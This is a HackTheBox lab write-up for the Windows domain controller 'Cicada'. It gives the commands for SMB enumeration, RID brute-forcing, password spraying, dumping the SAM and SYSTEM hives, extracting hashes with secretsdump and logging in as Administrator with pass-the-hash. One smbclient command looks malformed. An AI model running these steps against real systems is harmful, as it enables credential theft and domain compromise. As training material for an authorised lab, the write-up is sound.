
# ✨ Cicada — HackTheBox Writeup (Retired)

🌐 **IP:** `10.10.11.35`  
🖥️ **OS:** Windows Server 2022  
🎯 **Difficulty:** Medium  
📚 **Category:** Active Directory, Kerberos, SMB, LDAP, WinRM  
👤 **Author:** [theblxckcicada](https://app.hackthebox.com/users/796798)  
🧰 **Tools:** `nmap`, `rustscan`, `nxc`, `crackmapexec`, `smbclient`, `evil-winrm`, `impacket-secretsdump`  
🎓 **Certs:** eCPPTv3, Dante Lab | Preparing for OSCP

---

## 🔍 Initial Enumeration

### 🚀 RustScan
```bash
rustscan -a 10.10.11.35 -- -sV
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
61979/tcp open  msrpc         Microsoft Windows RPC
```

🧠 This host is most likely a domain controller for `cicada.htb`.

---

## 📡 DNS Enumeration
```bash
dig any cicada.htb @10.10.11.35
```

🗂️ Records found:
- `A` record for `cicada.htb`
- Nameserver: `cicada-dc.cicada.htb`
- Multiple `AAAA` records

---

## 📂 SMB Share Enumeration

```bash
nxc smb 10.10.11.35 -u x -p '' --shares
```

📁 Shares:
- `HR` (READ)
- `DEV`
- `NETLOGON`
- `SYSVOL`

### 📥 Accessing HR Share
```bash
smbclient -N //10.10.11.35/HR
smb: \> get "Notice from HR.txt"
```

📄 Inside the file:
```
Default password: Cicada$M6Corpb*@Lp#nZp!8
```

---

## 🧑‍💻 User Enumeration

### RID Brute-Force
```bash
nxc smb 10.10.11.35 -u x -p '' --rid-brute
```

🧍 Users:
- michael.wrightson
- sarah.dantelia
- john.smoulder
- david.orelious
- emily.oscars

---

## 🎯 Password Spray

```bash
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

✅ Valid credentials:
- `michael.wrightson`

---

## 💡 Leaked Password in Description

```bash
nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

📌 Found:
```
Just in case I forget my password is aRt$Lp#7t*VQ!3
```

---

## 🔓 Access as david.orelious

```bash
smbclient -U david.orelious \10.10.11.35\DEV
smb: \> get Backup_script.ps1
```

Inside:
```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

---

## 🛠️ WinRM Access as emily.oscars

```bash
evil-winrm -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35
```

👤 Group memberships:
- Backup Operators ✅
- Remote Management Users ✅

---

## 🧪 Privilege Escalation (Backup Privileges)

```powershell
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
```

Download & extract:
```bash
impacket-secretsdump -system system.save -sam sam.save LOCAL
```

NT hash:
```
Administrator:500:...:2b87e7c93a3e8a0ea4a581937016f341:::
```

---

## 🏁 Final Access

```bash
evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

🎉 Rooted!

---

